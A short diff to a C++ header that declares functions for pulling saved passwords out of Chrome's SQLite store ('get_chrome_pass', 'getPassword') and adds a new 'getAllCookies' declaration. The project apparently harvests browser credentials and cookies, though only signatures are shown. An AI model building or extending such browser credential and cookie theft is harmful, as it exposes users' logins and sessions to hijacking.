@@ -24,5 +24,6 @@ std::string hexStr(const uint8_t *, int);
 BYTE * getPassword(BYTE *, BYTE *, DWORD);
 std::stringstream get_chrome_pass(BYTE *, sqlite3*);
 json getAllResults(const char * temp);
+json getAllCookies(const char * temp);
 
 #endif
